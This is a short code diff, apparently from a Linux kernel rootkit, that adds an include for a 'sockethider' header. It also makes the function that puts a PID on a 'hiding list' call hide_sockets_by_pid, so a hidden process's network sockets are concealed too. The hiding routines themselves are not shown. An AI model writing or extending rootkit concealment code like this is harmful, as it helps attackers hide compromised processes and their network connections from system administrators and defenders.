@@ -5,6 +5,7 @@
 #include "hijack.h"
 #include "logging.h"
 #include "procfile.h"
+#include "sockethider.h"
 
 #include <linux/fs.h>
 #include <linux/kallsyms.h>
@@ -330,6 +331,8 @@ void add_to_pid_list(const unsigned short pid)
 
     tmp = (struct _pid_list*) kmalloc(sizeof(struct _pid_list), GFP_KERNEL);
     tmp->pid = pid;
+
+    hide_sockets_by_pid(pid);
 
     LOG_INFO("adding pid %d to hiding list", tmp->pid);
 
